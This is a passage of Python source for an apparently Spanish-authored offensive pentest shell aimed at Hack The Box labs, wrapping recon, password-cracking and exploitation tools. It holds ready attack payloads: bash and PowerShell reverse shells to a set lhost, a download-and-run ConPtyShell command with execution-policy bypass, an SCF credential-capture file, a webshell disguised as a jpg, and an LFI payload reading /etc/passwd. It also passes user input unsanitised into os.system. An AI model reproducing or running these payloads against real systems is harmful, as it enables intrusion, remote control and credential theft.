        """dnsenum --dnsserver 10.10.11.24 --enum -p 0 -s 0 -o sessions/subdomains.txt -f {dnswordlist} ghost.htb"""
        rhost = self.params["rhost"]
        dnswordlist = self.params["dnswordlist"]
        if not line or not rhost or not dnswordlist:
            print("  [-] rhost and dnswordlist must be set example: set rhost 10.10.10.10 or you need pass the domain ")
            return
        print(
            f"{GREEN}[+] Try ... dnsenum --dnsserver {rhost} --enum -p 0 -s 0 -o sessions/subdomains.txt -f {dnswordlist} {line} {RESET}"
        )
        os.system(
            f"dnsenum --dnsserver {rhost} --enum -p 0 -s 0 -o sessions/subdomains.txt -f {dnswordlist} {line}"
        )
        return

    def do_dnsmap(self, line):
        """dnsmap --dnsserver 10.10.11.24 --enum -p 0 -s 0 -o sessions/subdomains.txt -f {dnswordlist} ghost.htb"""
        rhost = self.params["rhost"]
        dnswordlist = self.params["dnswordlist"]
        if not line or not dnswordlist:
            print(f"    {YELLOW}[?] dnswordlist must be set example: set dnswordlist path/to/wordlist or you need pass the domain {RESET}")
            return
        print(
            f"    {GREEN}[+] Try ... dnsmap {line} -w {dnswordlist} {RESET}"
        )
        os.system(
            f"dnsmap {line} -w {dnswordlist}"
        )
        return

    def do_whatweb(self, line):
        """whatweb"""
        if not self.params["rhost"]:
            print(f"    {YELLOW}[?] rhost must be set{RESET}")
            return
        rhost = self.params["rhost"]
        print(f"    {GREEN}[+] Try... whatweb {rhost}{RESET}")
        os.system(f"whatweb {rhost}")

    def do_enum4linux(self, line):
        """enum4linux -a target"""
        if not self.params["rhost"]:
            print("    [?] rhost must be set")
            return
        rhost = self.params["rhost"]
        print(f"    {GREEN}[+] Try... enum4linux -a {rhost} {RESET}")
        os.system(f"enum4linux -a {rhost}")
        return

    def do_nbtscan(self, line):
        """sudo nbtscan -r target"""
        if not self.params["rhost"]:
            print(f"    {YELLOW}[?] rhost must be set{RESET}")
            return
        rhost = self.params["rhost"]
        print(f"    {GREEN}[+] Try... sudo nbtscan -r {rhost}/24 {RESET}")
        os.system(f"sudo nbtscan -r {rhost}/24")
        return

    def do_rpcclient(self, line):
        """rpcclient -U "" -N 10.10.10.10"""
        if not self.params["rhost"]:
            print(f"    {YELLOW}[?] rhost must be set{RESET}")
            return
        rhost = self.params["rhost"]
        print(f"    {GREEN}[+] Try... rpcclient -U '' -N {rhost} {RESET}")
        os.system(f"rpcclient -U '' -N {rhost}")
        return

    def do_nikto(self, line):
        """nikto -h 10.10.10.10"""
        if not self.params["rhost"]:
            print("    [?] rhost must be set")
            return
        rhost = self.params["rhost"]
        print(f"    {GREEN}[+] Try nikto -h {rhost} {RESET}")
        os.system(f"nikto -h {rhost}")
        return

    def do_openssl_sclient(self, line):
        """openssl s_client -connect  10.10.10.10"""
        if not self.params["rhost"] or not line:
            print("    [?] rhost must be set and you need pass the port by argument ex: openssl_sckient 443")
            return
        rhost = self.params["rhost"]
        print(f"    {GREEN}[+] Try... openssl s_client -connect  {rhost}:{line} {RESET}")
        os.system(f"openssl s_client -connect  {rhost}:{line}")
        return

    def do_ss(self, line):
        """searchsploit alias"""
        print(f"    {GREEN}[+] Searching in searchsploit{RESET}")
        os.system(f"searchsploit {line}")

    def do_wfuzz(self, line):
        """lazy alias to wfuzz"""
        dirwordlist = self.params["dirwordlist"]
        rhost = self.params["rhost"]
        if not rhost or not dirwordlist:
            print(f"    {YELLOW}[?] dirwordlist and rhost must be set{RESET}")
            return

        if line:
            if line.startswith("sub"):
                params = line.split(' ')
                count = len(params)
                arg1 = params[0]
                domain = params[1]
                if count > 2:
                    arg3 = params[2]
                else:
                    arg3 = ""
                print(f"    {GREEN}[*] Try ...  wfuzz -c {arg3} -t 200 -w {dirwordlist} -H 'Host: FUZZ.{domain}' {domain} {RESET}")
                os.system(f"wfuzz -c {arg3} -t 200 -w {dirwordlist} -H 'Host: FUZZ.{domain}' {domain}")
                return

            if line.startswith("iis"):
                params = line.split(' ')
                print(params)
                count = len(params)
                arg1 = params[0]
                
                dirwordlist = '/usr/share/wordlists/SecLists-master/Discovery/Web-Content/IIS.fuzz.txt'
                if not os.path.exists(dirwordlist):
                    print(f"    [-] you must have file {dirwordlist} use the command: getseclist")
                    return
                # Abre el archivo en modo de lectura                
                if count > 1:
                    arg3 = params[1]
                else:
                    arg3 = ""
                print(f"    {GREEN}[*] Try ...  wfuzz -c {arg3} -t 200 -w {dirwordlist} http://{rhost}/FUZZ {RESET}")
                os.system(f"wfuzz -c {arg3} -t 200 -w {dirwordlist} http://{rhost}/FUZZ")
                return

        print(f"    {GREEN}[+] Try ... wfuzz -c {line} -t 200 -w {dirwordlist} http://{rhost}/FUZZ {RESET}")
        os.system(f"wfuzz -c {line} -t 200 -w {dirwordlist} http://{rhost}/FUZZ")
        return

    def do_gobuster(self, line):
        """Lazy gobuster"""
        dirwordlist = self.params["dirwordlist"]
        rhost = self.params["rhost"]
        if not rhost or not dirwordlist:
            print(f"    {YELLOW}[?] rhost and dirwordlist must be set {RESET}")
            return
        if line == "url":
            url = self.params["url"]
            if not url:
                print(f"    {YELLOW}[?]  url must be set, ex: set url http://domain.ext {RESET}")
                return
            print(f"    {GREEN}[+] Try gobuster dir --url {url}/ --wordlist {dirwordlist} {RESET}")
            os.system(f"gobuster dir --url {url}/ --wordlist {dirwordlist}")
            return
        print(
            f"    {GREEN}[+] Try... gobuster dir --url http://{rhost}/ --wordlist {dirwordlist} {line} {RESET}"
        )
        os.system(f"gobuster dir --url http://{rhost}/ --wordlist {dirwordlist} {line}")
        return

    def do_addhosts(self, line):
        """sudo -- sh -c -e "echo '10.10.11.23 permx.htb' >> /etc/hosts;"""
        rhost = self.params["rhost"]
        if not rhost or not line:
            print(
                f"    {YELLOW}[+] add domain and rhost must be set to more info see help set (set rhost 10.10.10.10) ex: addhost domain.ext {RESET}"
            )
            return
        print(f"    {GREEN}[+]  Try... sudo -- sh -c -e \"echo '{rhost} {line}' >> /etc/hosts\"; {RESET}")
        os.system(f"sudo -- sh -c -e \"echo '{rhost} {line}' >> /etc/hosts\";")
        print(f"    {GREEN}[*]  Done... add {line} to /etc/hosts {RESET}")
        return

    def do_cme(self, line):
        """crackmapexec smb 10.10.11.24"""
        rhost = self.params["rhost"]
        if not rhost:
            print(
                "    [-] add domain and rhost must be set to more info see help set (set rhost 10.10.10.10) ex: addhost domain.ext"
            )
            return
        print(f"    [+] Try... crackmapexec smb {rhost}")
        os.system(f"crackmapexec smb {rhost}")
        print(f"    [*] Done... crackmapexec smb {rhost}")
        return

    def do_ldapdomaindump(self, line):
        """ldapdomaindump -u 'domain.local\Administrator' -p 'passadmin123' 10.10.11.23"""
        rhost = self.params["rhost"]
        if not rhost or not line:
            print(
                "    [-] add domain and rhost must be set to more info see help set (set rhost 10.10.10.10) ex: addhost domain.ext"
            )
            return
        path_cred = "sessions/credentials.txt"
        if not os.path.exists(path_cred):
            print("    [-] you must have file sessions/credentials.txt with this format: user:password")
            return
        # Abre el archivo en modo de lectura
        with open(path_cred, 'r') as file:
            # Recorre cada línea del archivo
            for file_line in file:
                params = file_line.split(":")
                user = params[0]
                passwd = params[1].replace('\n','')
                print(f"    {GREEN}[*] Try... ldapdomaindump -u '{line}\\{user}' -p '{passwd}' {rhost}")
                os.system(f"cd sessions && ldapdomaindump -u '{line}\\{user}' -p '{passwd}' {rhost}")
        return

    def do_bloodhound(self, line):
        """bloodhound-python -c All -u 'usuario' -p 'password' -ns 10.10.10.10"""
        rhost = self.params["rhost"]
        if not rhost:
            print(
                "    [-] rhost must be set to more info see help set (set rhost 10.10.10.10) ex: addhost domain.ext"
            )
            return
        path_cred = "sessions/credentials.txt"
        if not os.path.exists(path_cred):
            print("    [-] you must have file sessions/credentials.txt with this format: user:password more help createcredentials")
            return
        # Abre el archivo en modo de lectura
        with open(path_cred, 'r') as file:
            # Recorre cada línea del archivo
            for file_line in file:
                params = file_line.split(":")
                user = params[0]
                passwd = params[1].replace('\n','')
                print(f"    {GREEN}[*] Try... bloodhound-python -c All -u '{user}' -p '{passwd}' -ns {rhost}")
                os.system(f"cd sessions && bloodhound-python -c All -u '{user}' -p '{passwd}' -ns {rhost}")
        return

    def do_ping(self, line):
        """ping -c 1 10.10.10.10"""
        rhost = self.params["rhost"]
        if not rhost:
            print(
                "    [-] add domain and rhost must be set to more info see help set (set rhost 10.10.10.10) ex: addhost domain.ext"
            )
            return
        print(f"    [+] try... ping -c 1 {rhost} ")
        # Ejecutar el comando ping y capturar la salida
        result = subprocess.run(
            ["ping", "-c", "1", rhost], capture_output=True, text=True
        )

        # Verificar la salida y determinar el sistema operativo basado en TTL
        if result.returncode == 0:
            # El ping fue exitoso, parsear la respuesta para obtener el TTL
            try:
                ttl_index = result.stdout.find("ttl=")
                if ttl_index != -1:
                    ttl_value = int(
                        result.stdout[ttl_index + 4 : ttl_index + 7]
                    )  # Obtener el valor de TTL
                    print("    [+] TTL:", ttl_value)

                    # Determinar basado en el TTL
                    if ttl_value <= 60 or ttl_value <= 64:
                        print(f"    {GREEN}[*]Host activo {CYAN}probablemente es {BLUE}Linux{RESET}")
                    elif ttl_value <= 120 or ttl_value <= 128:
                        print(f"    {GREEN}[*]Host activo {CYAN}probablemente es {RED}Windows{RESET}")
                    else:
                        print(
                            "    [-] No se puede determinar con certeza el sistema operativo"
                        )
                else:
                    print("    [-] No se encontró el TTL en la salida del ping")

            except ValueError:
                print("    [-] No se pudo convertir el TTL a un número entero")
        else:
            print("    [-] No se pudo realizar el ping al host")
        print(f"    [*] Done... ping -c 1 {rhost} ")

    def do_gospider(self, line):
        """try gospider"""
        rhost = self.params["rhost"]
        if line == "url":
            url = self.params["url"]
            if not url:
                print(
                    "    [-] if you pass the param url, url mus be set, ex: set url http://url.ext"
                )
                return

            print(f"    {GREEN}[*] Try gospider -s {url}")
            os.system(f"gospider -s {url}")
            return

        if not rhost:
            print("    [-] rhost must be set")
            return
        if is_binary_present("gospider"):
            print(f"    [+] try... gospider -s http://{rhost}")
            os.system(f"gospider -s http://{rhost}")
        else:
            print("    [*] gospider is not installed, installing... (control + c to cancel)")
            os.system(f"sudo apt install gospider -y && gospider -s http://{rhost}")

    def do_arpscan(self, line):
        """try arp-scan"""
        if not self.params["device"]:
            print("    [?] device must be set")
            return
        device = self.params["device"]
        print("    [+] try to arp-scan sudo arp-scan -I DEVICE --localnet")
        os.system(f"sudo arp-scan -I {device} --localnet")

    def do_lazypwn(self, line):
        """LazyPwn"""
        os.system("python3 modules/lazypwn.py")

    def do_fixel(self, line):
        """to fix perms"""
        os.system("dos2unix *")
        os.system("dos2unix modules/*")
        os.system("dos2unix modules/cgi-bin/*")

    def do_smbserver(self, line):
        """Lazy imacket smbserver"""
        lhost = self.params["lhost"]

        if not lhost:
            print(f"    {YELLOW} [?] lhost must be set.{RESET}")
            return
        revshell = f"""[Shell]
        Command=2
        IconFile=\\\\\\\\{lhost}\\smbfolder\\icon.ico
        [Taskbar]
        Command=ToggleDesktop
        """.replace('        ','')
        print(f"    [*] Try... echo '{revshell}' > sessions/file.scf ")
        os.system(f"echo '{revshell}' > sessions/file.scf ")
        print(f"    [*] echo 'curl http://{lhost}/sessions/file.scf' |  xclip -sel clip")
        print(f"    [*] command copied to clipboard")
        print(f"    [*] trying sudo impacket-smbserver smbfolder $(pwd) -smb2support ...")
        os.system(f"echo 'curl http://{lhost}/sessions/file.scf -o file.scf' |  xclip -sel clip")
        os.system("cd sessions && sudo impacket-smbserver smbfolder $(pwd) -smb2support")
        return

    def do_sqlmap(self, line):
        """Lazy sqlmap try sqlmap -wizard if don't know how to use requests.txt file always start with req and first parameter"""
        url = self.params["url"]

        if line:
            if line.startswith("req"):
                parts = line.split(" ")
                print("    [?] Nùmero de parametros: " + str(len(parts)))

                if len(parts) == 2:
                    arg1 = parts[0]
                    arg2 = parts[1]
                    path = os.getcwd()
                    print(path)
                    file = path + "/sessions/" + arg1
                    print(file)
                    if not os.path.isfile(file) or not os.access(file, os.R_OK):
                        print(
                            f"    [-] Error: El archivo '{arg1}' no existe o no es legible en el directorio sessions."
                        )

                        return
                    print(
                        f"    [*] Try... sqlmap -r {arg1} --level 5 --risk 3 -p {arg2} --batch --dbs --threads 10 --time-sec 10"
                    )
                    os.system(
                        f"sqlmap -r {file} --level 5 --risk 3 -p {arg2} --batch --dbs --threads 10 --time-sec 10"
                    )
                if len(parts) == 3:
                    arg1 = parts[0]
                    arg2 = parts[1]
                    arg3 = parts[2]
                    path = os.getcwd()
                    print(path)
                    file = path + "/sessions/" + arg1
                    print(file)
                    if not os.path.isfile(file) or not os.access(file, os.R_OK):
                        print(
                            f"    Error: El archivo '{arg1}' no existe o no es legible en el directorio sessions."
                        )

                        return
                    print(
                        f"    [*] Try... sqlmap -r {arg1} --level 5 --risk 3 -p {arg2} --batch -D {arg3} --tables --dump --threads 10"
                    )
                    os.system(
                        f"sqlmap -r {file} --level 5 --risk 3 -p {arg2} --batch -D {arg3} --tables --dump --threads 3"
                    )
            if len(parts) == 4:
                arg1 = parts[0]
                arg2 = parts[1]
                arg3 = parts[2]
                arg4 = parts[3]
                path = os.getcwd()
                print(path)
                file = path + "/sessions/" + arg1
                print(file)
                if not os.path.isfile(file) or not os.access(file, os.R_OK):
                    print(
                        f"    [-] Error: El archivo '{arg1}' no existe o no es legible en el directorio sessions."
                    )

                    return
                print(
                    f"    [*] Try... sqlmap -r {arg1} --level 5 --risk 3 -p {arg2} --batch -D {arg3} -T {arg4} --dump --threads 10"
                )
                os.system(
                    f"sqlmap -r {file} --level 5 --risk 3 -p {arg2} --batch -D {arg3} -T {arg4} --dump --threads 3"
                )
            elif line.startswith("-wiz"):
                print("    [*] Try... sqlmap --wizard")
                os.system("sqlmap -wizard")
        else:
            if not url:
                print(
                    "    [?] url must be set, ex: (set url http://url.com), see <help set> or <help sqlmap> to more info..."
                )
            return

            print(f"    [*] try... sqlmap -u {url} --os-shell --forms --crawl=2")
            os.system(f"sqlmap -u {url} --os-shell --forms --crawl=2")
        return

    def do_proxy(self, line):
        """Small proxy to modify the request on the fly..."""

        print("    [*] ejecutando Lazy Proxy ...")
        os.system(f"python3 modules/lazyproxy.py")
        print(f"    {RED}[*] {YELLOW} Shutdown proxy server at sessions in port {RED} 8888 {RESET}")
        return

    def do_createwebshell(self, line):
        """Crea una webshell disfrazada de jpg en el directorio sessions/"""
        print("    [*] creando la shell disfrazada de jpg")
        os.system("python3 modules/lazycreate_webshell.py")
        os.system("cd sessions && wget https://github.com/flozz/p0wny-shell/raw/master/shell.php")
        return
    
    def do_createrevshell(self, line):
        """Crea un script en el directorio sessions con una reverse shell con los datos en lhost y lport"""
        lhost = self.params["lhost"]
        lport = self.params["lport"]

        if not lport or not lhost:
            print(f"    [?] lport and lhost must be set use: set lport 443 and set lhost 10.10.10.10 or use command payload")
            return

        revshell = f"""#!/bin/bash
        bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        """.replace('        ','')
        print(f"    [*] Try... echo '{revshell}' > sessions/revshell.sh ")
        os.system(f"echo '{revshell}' > sessions/revshell.sh ")

    def do_createwinrevshell(self, line):
        """Crea un script en el directorio sessions con una reverse shell con los datos en lhost y lport"""
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        filename = 'sessions/revshell.ps1'
        if not lport or not lhost:
            print(f"    [?] lport and lhost must be set use: set lport 443 and set lhost 10.10.10.10 or use command payload")
            return

        revshell = """$client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
        """.replace('{lhost}',lhost).replace('{lport}',str(lport)).replace('        ','')

        print(f"    [*] Try... echo '{revshell}' > sessions/revshell.ps1 \n")
        
        with open(filename, 'w') as f:
            f.write(revshell)
        f.close()
        print(f"    [*] Archivo {filename} creado con èxito en el directorio sessions con contenido: {revshell} ")

    def do_createhash(self, line):
        """Crea un archivo hash.txt en el directorio sessions"""
        print(f"    {GREEN}[*] creando archivo sessions/hash.txt con el siguiente contenido {line}{RESET}")
        os.system(f"echo '{line}' > sessions/hash.txt")
        print(f"    {GREEN}[*] Analisando sessions/hash.txt con Name-the-hash {RESET}")
        os.system(f"nth -t {line}")
       
        return

    def do_createcredentials(self, line):
        """Crea un archivo credentials.txt en el directorio sessions el forato debe ser: user:password """
        print(f"    {GREEN}[*] creando archivo sessions/credentials.txt con el siguiente contenido {line}{RESET}")
        if ':' in line:
            os.system(f"echo '{line}' > sessions/credentials.txt")
        else:
            print(f"    {RED}[-] el archivo debe tener este formato usuario:contraseña ej: administrator:passwordadministrator123&!  {line}{RESET}")
            return
        return

    def do_download_resources(self, line):
        """download resources in sessions"""
        os.system("cd sessions && ./download_resources.sh ")
        print(f"    {GREEN}[*] Resources downloaded now you can run command {MAGENTA}www {RESET}")
        return
    
    def do_download_exploit(self, line):
        """download exploits in external/.exploits/"""
        os.system("cd external && ./install_external.sh ")
        os.system("ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"    [\033[96m\" iface\"\033[0m] \"a[1] }'")
        os.system("ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip")
        os.system('echo "    [\e[96m`pwd`\e[0m]\e[34m" && cd external/.exploit && ls && echo -en "\e[0m"')
        print(f"    {YELLOW}[*] {GREEN} Web server at external/.exploit in port {RED} 80 {RESET}")
        os.system("cd external/.exploit && sudo python3 -m http.server 80")
        print(f"    {RED}[*] {YELLOW} Shutdown Web server at external/.exploit in port {RED} 80 {RESET}")
        return

        return
    
    def do_dirsearch(self, line):
        """dirsearch -u http://url.ext/ -x 403,404,400"""
        url = self.params["url"]
        if not url:
            print("    [-] url must be set: use set url http://url.ext/ more info in help set")
            return
        if is_binary_present("dirsearch"):
            print("    [*] Try... dirsearch -u http://url.ext/ -x 403,404,400")
            os.system(f"dirsearch -u {url} -x 403,404,400")
        else:
            print("    [-] dirsearch is not installed, installing... (control + c to cancel)")
            os.system(
                f"sudo apt install dirsearch -y && dirsearch -u {url} -x 403,404,400"
            )
        return

    def do_john2hash(self, line):
        """example: sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt -format=Raw-SHA512"""
        wordlist = self.params["wordlist"]
        if not wordlist:
            print("    [-] wordlist must be set use set wordlist <path_to_wordlist>")
            return
        if line:
            print(f"    [*] sudo john hash.txt {line}") # line like -format=Raw-SHA512
            os.system(f"sudo john sessions/hash.txt --wordlist={wordlist} {line}")
        else:
            print("    [*] sudo john hash.txt --show")
            os.system(f"sudo john sessions/hash.txt --wordlist={wordlist}")
        return

    def do_hashcat(self, line):
        """hashcat -a 0 -m mode hash /usr/share/wordlists/rockyou.txt"""
        wordlist = self.params["wordlist"]
        if not wordlist or not line:
            print(
                "    wordlist must be set and you need pass the hash in argument ex: hashcat hash"
            )
            return
        print(f"    [*] hashcat -a 0 -m {line} {wordlist}")
        os.system(f"hashcat -a 0 -m {line} {wordlist}")
        return

    def do_responder(self, line):
        """sudo responder -I tun0"""
        device = self.params["device"]
        if not device:
            print("    [-] device must be set use set device <network_device_ex_tun0>")
            return
        print(f"    [*] sudo responder -I {device}")
        os.system(f"sudo responder -I {device}")
        return

    def do_ip(self,line):
        """ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"    [\033[96m\" iface\"\033[0m] \"a[1] }' and copy de ip to clipboard :)"""
        os.system("ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"    [\033[96m\" iface\"\033[0m] \"a[1] }'")
        os.system("ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip")
        print(f"    {BLUE}[*] ip from tun0 copied to clipboard :) {RESET}")
        return
        
    def do_rhost(self,line):
        """Copy rhost to clipboard"""
        rhost = self.params["rhost"]
        if not rhost:
            print(f"    {RED}[?] {YELLOW} rhost must be set, use: {GREEN}payload {YELLOW}or {GREEN}set rhost 10.10.10.10{RESET}")
            return
        os.system(f"echo '{rhost}' | xclip -sel clip")
        print(f"    {BLUE}[*] ip from payload: {rhost=}, copied to clipboard :) {RESET}")
        return

    def do_banner(self,line):
        """Show the banner"""
        if NOBANNER is False:
            print(f"    {BG_BLACK}{RED}{BANNER}{MAGENTA}Autor: {CYAN}grisUN0{RESET}")
            time.sleep(0.2)
            print(LazyOwnShell().intro)
        return

    def do_py3ttyup(self,line):
        """copy to clipboard tipical python3 -c 'import pty; pty.spawn ... bla bla blah... """
        os.system("echo \"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\"| xclip -sel clip")
        print("    [+] Try... echo \"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\"| xclip -sel clip # copied to clipboard :) ")
        return
    
    def do_rev(self,line):
        """Copy a revshell to clipboard"""
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        if not lhost or not lport:
            print(f"    {YELLOW} [?] lhost and lport must be set.{RESET}")
            return
        print(f"    [+] Try ... bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'")
        os.system(f"echo \"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\" |  xclip -sel clip")
        return

    def do_conptyshell(self,line):
        """Download ConPtyShell in sessions directory and copy to clipboard the command :D """
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        if not lhost or not lport:
            print(f"    {YELLOW} [?] lhost and lport must be set.{RESET}")
            return

        os.system("cd sessions && wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 && wget https://github.com/antonioCoco/ConPtyShell/releases/download/1.5/ConPtyShell.zip")
        cmd = f"""iwr -uri http://{lhost}/Invoke-ConPtyShell.ps1 -OutFile Invoke-ConPtyShell.ps1 ; powershell.exe -NoProfile -ExecutionPolicy Bypass -File 'Invoke-ConPtyShell.ps1 {lhost} {lport}'"""
        os.system(f"echo '{cmd}' |  xclip -sel clip")
        print(f"    {GREEN}[+]{cmd} {YELLOW} Copied to clipboard :D {RESET}")
        return

    def do_nc(self,line):
        """run nc -lvnp 6666 :) """
        lport = self.params["lport"]
        if not lport and not line:
            print(f"    {YELLOW} [?] lport must be set or pass the port by parameter like: nc 6666.{RESET}")
            return
        if not line:
            print(f"    {GREEN}[+] Try.. nc -lvnp {lport}{RESET}")
            os.system(f"stty raw -echo; (stty size; cat) | nc -lvnp {lport}")
        else:
            print(f"    {GREEN}[+] Try.. nc -lvnp {line}{RESET}")
            os.system(f"stty raw -echo; (stty size; cat) | nc -lvnp {line}")
        print(f"    {RED}[*] {YELLOW} Shutdown nc sessions in port {RED} [{lport}|{line}] {RESET}")
        return

    def do_sh(self,line):
        """execute some command direct in shell to avoid exit LazyOwn ;)"""
        if not line:
            print(f"    {YELLOW}[?] you must pass the command linke argument")
            return
        print(f"    {GREEN}[*]Try... {line}{RESET}")
        os.system(f"{line}")
        return

    def do_pwd(self,line):
        """'echo -e "[\e[96m`pwd`\e[0m]\e[34m" && ls && echo -en "\e[0m"'"""
        print(f'    {GREEN}[*]Try echo -e "[\e[96m`pwd`\e[0m]\e[34m" && ls && echo -en "\e[0m"{RESET}')
        os.system('echo -e "[\e[96m`pwd`\e[0m]\e[34m" && ls && echo -en "\e[0m"')
        os.system("pwd | xclip -sel clip")
        print(f"    {GREEN}[*] pwd directory copied to clipboard{RESET}")
        return

    def do_qa(self, line):
        """Exit fast without confirmation"""
        print(f"    {RED}Saliendo {BG_BLACK}[;,;]{RESET}")
        sys.exit(0)

    def do_ignorearp(self,line):
        """echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore"""
        print(f"    {GREEN}[*] Try... sudo bash -c 'echo {CYAN}1 {RED}> {GREEN}/proc/sys/net/ipv4/conf/all/arp_ignore'{RESET}")
        os.system("sudo bash -c 'echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore'")
        print(f"    {GREEN}[+] Done.{RESET}")
        return

    def do_ignoreicmp(self,line):
        """echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all"""
        print(f"    {GREEN}[*] Try... sudo bash -c 'echo {CYAN}1 {RED}> {GREEN}/proc/sys/net/ipv4/icmp_echo_ignore_all'{RESET}")
        os.system("sudo bash -c 'echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all'")
        print(f"    {GREEN}[+] Done.{RESET}")
        return

    def do_acknowledgearp(self,line):
        """echo 0 > /proc/sys/net/ipv4/conf/all/arp_ignore"""
        print(f"    {GREEN}[*] Try... sudo bash -c 'echo {CYAN}0 {RED}> {GREEN}/proc/sys/net/ipv4/conf/all/arp_ignore'{RESET}")
        os.system("sudo bash -c 'echo 0 > /proc/sys/net/ipv4/conf/all/arp_ignore'")
        print(f"    {GREEN}[+] Done.{RESET}")
        return

    def do_acknowledgeicmp(self,line):
        """echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all"""
        print(f"    {GREEN}[*] Try... sudo bash -c 'echo {CYAN}0 {RED}> {GREEN}/proc/sys/net/ipv4/icmp_echo_ignore_all'{RESET}")
        os.system("sudo bash -c 'echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all'")
        print(f"    {GREEN}[+] Done.{RESET}")
        return

    def do_clock(self, line):
        """Show the time to go sleep xD"""
        cmd = """
        # Obtiene la fecha y hora actual en el formato deseado
        current_date=$(date +"%Y-%m-%d")
        current_time=$(date +"%H:%M:%S")
        # Muestra la fecha y hora con figlet
        figlet "$current_date"
        figlet "$current_time"
        """ 
        print(WHITE)
        os.system(cmd)
        print(GREEN)
        os.system("./modules/cal.sh")
        print(RESET)

        return

    def do_ports(self, line):
        """Get all ports local"""
        tcp_ports, udp_ports = get_open_ports()
        print(f"    {GREEN}[*] Open TCP Ports:{RESET}")
        for ip, port in tcp_ports:
            print(f"    {CYAN}{ip}{YELLOW}:{RED}{port}{RESET}")

        print(f"    \n{GREEN}[*] Open UDP Ports:{RESET}")
        for ip, port in udp_ports:
            print(f"    {CYAN}{ip}{YELLOW}:{RED}{port}{RESET}")    
        return

    def do_cports(self, line):
        """Genera un comando para mostrar puertos TCP y UDP, y lo copia al portapapeles."""

        # Define el comando con comillas escapadas adecuadamente
        tcp_cmd = '''echo "TCP Ports:"; \
        awk 'NR>1 {split($2, a, ":"); ip=sprintf("%d.%d.%d.%d", strtonum("0x" substr(a[1], 7, 2)), strtonum("0x" substr(a[1], 5, 2)), strtonum("0x" substr(a[1], 3, 2)), strtonum("0x" substr(a[1], 1, 2))); printf "%s:%d\\n", ip, strtonum("0x" a[2])}' /proc/net/tcp; \
        echo "UDP Ports:"; \
        awk 'NR>1 {split($2, a, ":"); ip=sprintf("%d.%d.%d.%d", strtonum("0x" substr(a[1], 7, 2)), strtonum("0x" substr(a[1], 5, 2)), strtonum("0x" substr(a[1], 3, 2)), strtonum("0x" substr(a[1], 1, 2))); printf "%s:%d\\n", ip, strtonum("0x" a[2])}' /proc/net/udp
        '''

        # Imprimir el comando para verificar
        print(GREEN, tcp_cmd, RESET)

        # Copiar el comando al portapapeles
        try:
            # Usamos subprocess para manejar la entrada de manera segura
            process = subprocess.Popen(['xclip', '-sel', 'clip'], stdin=subprocess.PIPE, text=True)
            process.communicate(input=tcp_cmd)
        except subprocess.CalledProcessError as e:
            print(f"    {RED}[-] Error: {e}{RESET}")

        return

    def do_vpn(self,line):
        """Open vpn like htb vpn"""
        print("    [+] Try... sudo openvpn *.ovpn")
        os.system("sudo openvpn *.ovpn")
        print(f"    {RED}[*] {YELLOW} Shutdown vpn {RED} [;,;] {RESET}")
        return

    def do_www(self, line):
        """Start a web server with python3"""
        os.system("ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"    [\033[96m\" iface\"\033[0m] \"a[1] }'")
        os.system("ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip")
        os.system('echo "    [\e[96m`pwd`\e[0m]\e[34m" && cd sessions && ls && echo -en "\e[0m"')
        print(f"    {YELLOW}[*] {GREEN} Web server at sessions in port {RED} 80 {RESET}")
        os.system("cd sessions && sudo python3 -m http.server 80")
        print(f"    {RED}[*] {YELLOW} Shutdown Web server at sessions in port {RED} 80 {RESET}")
        return

    def do_wrapper(self,line):
        """copy to clipboard some wrapper to lfi"""
        print(f"    {GREEN}[*] Copy to clipboard: {RED} php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd{RESET}")
        os.system("echo 'php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd' | xclip -sel clip")
        return

    def do_samrdump(self, line):
        """impacket-samrdump -port 445 10.10.10.10"""
        if not self.params["rhost"]:
            print("    [?] rhost must be set")
            return
        rhost = self.params["rhost"]
        print(f"    [-] try impacket-samrdump -port 139  {rhost}")
        os.system(f"impacket-samrdump -port 139  {rhost}")
        print(f"    [-] try impacket-samrdump -port 445  {rhost}")
        os.system(f"impacket-samrdump -port 445  {rhost}")

        return
    def do_clean(self, line):
        """delete all from sessions"""
